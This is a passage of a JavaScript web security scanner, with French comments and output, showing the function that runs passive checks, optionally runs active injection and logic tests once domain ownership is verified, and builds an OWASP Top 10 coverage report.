// la propriété ; le contrôle est fait côté serveur avant d'arriver ici).
async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
  log('INFO', 'SCAN', `Starting scan`, { target: url.href, scanId, mode });

  const active  = mode === 'active';
  const results = {};

  const onLine = (line) => {
    if (typeof emit === 'function') {
      try { emit(line); }
      catch (e) { console.error('[SCAN] emit error:', e.message); }
    }
    console.log('[SCAN]', line.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>'));
  };

  onLine(`▸ Cible : ${esc(url.href)}`);
  onLine(`▸ Démarrage : ${new Date().toLocaleString('fr-FR')}`);
  onLine('━'.repeat(50));

  try {
    // ── Phase passive : Reconnaissance non-intrusive (toujours exécutée) ─────
    onLine('▸ PHASE 1 — Reconnaissance passive');

    const [
      dnsResult, tlsResult, headersResult, corsResult,
      cookiesResult, techResult, robotsResult,
      httpsRedirectResult, mixedResult, secretsResult,
    ] = await Promise.all([
      testDNS(url, onLine),
      testTLS(url, onLine),
      testHeaders(url, onLine),
      testCORS(url, onLine, alertEmail),
      testCookies(url, onLine),
      testTechStack(url, onLine),
      testRobots(url, onLine),
      testHTTPSRedirect(url, onLine),
      testMixedContent(url, onLine),
      testSecretsInJS(url, onLine),
    ]);

    Object.assign(results, {
      dns:            dnsResult,
      tls:            tlsResult,
      headers:        headersResult,
      cors:           corsResult,
      cookies:        cookiesResult,
      tech:           techResult,
      robots:         robotsResult,
      https_redirect: httpsRedirectResult,
      mixed_content:  mixedResult,
      secrets_js:     secretsResult,
    });

    onLine('━'.repeat(50));

    if (!active) {
      onLine('▸ Tests actifs NON exécutés (mode passif).');
      onLine('▸ Vérifiez la propriété du domaine pour débloquer SQLi, XSS, RCE, etc.');
    } else {
      await wait(300);

      // ── Phase active 1 : Énumération / surface ────────────────────────────
      onLine('▸ PHASE 2 — Énumération active');
      results.ports           = await testPorts(url, onLine);           await wait(150);
      results.sensitive_files = await testSensitiveFiles(url, onLine);  await wait(150);
      results.dir_listing     = await testDirListing(url, onLine);      await wait(150);
      results.graphql         = await testGraphQL(url, onLine);
      onLine('━'.repeat(50));

      // ── Phase active 2 : Injection (séquentiel pour éviter le DoS) ─────────
      onLine('▸ PHASE 3 — Tests d\'injection actifs');
      results.sqli = await testSQLi(url, onLine, alertEmail); await wait(200);
      results.xss  = await testXSS(url, onLine, alertEmail);  await wait(200);
      results.lfi  = await testLFI(url, onLine, alertEmail);  await wait(200);
      results.rce  = await testRCE(url, onLine, alertEmail);  await wait(200);
      results.mako = await testSSTI(url, onLine, alertEmail); await wait(200);
      onLine('━'.repeat(50));

      // ── Phase active 3 : Tests logiques ───────────────────────────────────
      onLine('▸ PHASE 4 — Tests logiques');
      results.open_redirect    = await testOpenRedirect(url, onLine);   await wait(150);
      results.http_methods     = await testHTTPMethods(url, onLine);     await wait(150);
      results.host_injection   = await testHostInjection(url, onLine);   await wait(150);
      results.error_disclosure = await testErrorDisclosure(url, onLine);
    }

    // ── Score final ──────────────────────────────────────────────────────────
    const criticals = Object.values(results).filter(r => r && r.status === 'FAIL').length;
    const warnings  = Object.values(results).filter(r => r && r.status === 'WARN').length;
    const errors    = Object.values(results).filter(r => r && r.status === 'ERROR').length;

    results.vulns = {
      status:          criticals > 0 ? 'FAIL' : warnings > 3 ? 'WARN' : 'OK',
      critical_issues: criticals,
      warnings,
      errors,
      mode,
    };

    // ── Couverture OWASP Top 10 (2021) ─────────────────────────────────────────
    results.owasp = buildOwaspCoverage(results);
    onLine('━'.repeat(50));
    onLine('▸ COUVERTURE OWASP TOP 10 (2021)');
    for (const [cat, c] of Object.entries(results.owasp)) {
      if (!c.tested) { onLine(`  ○ ${cat} ${c.name} — non couvert`); continue; }
      onLine(`  ${c.issues > 0 ? '⚠' : '✓'} ${cat} ${c.name} — ${c.issues > 0 ? c.issues + ' problème(s)' : 'RAS'}`);
    }

    onLine('━'.repeat(50));
    onLine(`▸ RÉSULTATS : ${criticals} critique(s) | ${warnings} avertissement(s)${errors ? ` | ${errors} module(s) non analysé(s)` : ''}`);
    onLine('▸ Scan terminé ✓');
    log('INFO', 'SCAN', 'Done', { criticals, warnings, scanId });

    return results;

  } catch (e) {
    log('ERROR', 'SCAN', 'Fatal error', { error: e.message, scanId });
    onLine(`▸ Erreur fatale: ${esc(e.message)}`);
    throw e;
  }
}

module.exports = { runScan };
